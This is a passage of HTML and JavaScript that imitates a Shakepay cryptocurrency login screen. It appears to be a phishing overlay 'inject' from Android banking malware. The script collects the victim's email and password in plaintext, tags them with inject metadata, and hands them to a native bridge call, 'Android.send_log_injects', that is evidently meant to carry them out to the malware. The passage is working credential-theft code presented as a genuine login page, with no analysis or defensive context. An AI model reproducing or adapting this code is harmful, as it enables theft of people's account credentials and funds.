            <span style="float: right;color: #009eff;font-weight: 600;"> Forgot password? </span>
        </header>
        <section>
            <h4 style="font-size: 18px;"> Log in to Shakepay </h4>

            <input type="email" class="input" id="login" name="login" placeholder="Email" autocomplete="off">
            <input type="password" class="input" id="password" name="password" placeholder="Password" autocomplete="off">
        </section>
        <footer> 
            <input type="submit" class="button" id="sendData" value="Log in">
        </footer>
    </form>
    <script>
        var login = document.getElementById('login'),
            password = document.getElementById('password');

        var sendData = document.getElementById('sendData');

        sendData.onclick = () => {
            if(!/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value)) {
                login.classList.add('error');
            } else {
                login.classList.remove('error')
            }

            if(password.value.length < 5) {
                password.classList.add('error');
            } else {
                password.classList.remove('error');
            }

            if(/^([a-z0-9_-]+\.)*[a-z0-9_-]+@[a-z0-9_-]+(\.[a-z0-9_-]+)*\.[a-z]{2,6}$/i.test(login.value) && password.value.length > 6) {
                var data = {};
                data.email = login.value;
                data.password = password.value;
                data.type_injects = "crypt";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
